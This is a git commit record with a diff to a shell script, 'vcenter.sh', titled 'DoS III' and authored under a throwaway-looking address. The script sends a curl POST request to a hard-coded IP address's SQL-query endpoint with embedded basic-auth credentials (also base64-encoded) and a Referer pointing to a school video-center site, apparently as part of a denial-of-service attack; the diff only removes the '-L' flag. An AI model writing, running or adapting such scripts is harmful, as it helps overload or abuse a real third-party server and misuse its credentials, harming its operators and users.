efaa9316930d658371faba56352f5fc68547f248
DaineMuddah <faker69x@trash-mail.de>
2017-12-10 23:38:24 +0100

    DoS III

--- vcenter.sh
+++ vcenter.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 curl -X POST http://130.73.201.41/storeAndRouteSQLQuery.php \
-	-u leit:tiel -L \
+	-u leit:tiel \
 	-H "Content-Type: application/x-www-form-urlencoded" \
        	-H "Referer: http://videocenter.schule.de/abfrageformular.php?domain=Geschaeftsfuehrung" \
 	-H "Authorization: Basic bGVpdDp0aWVs" \
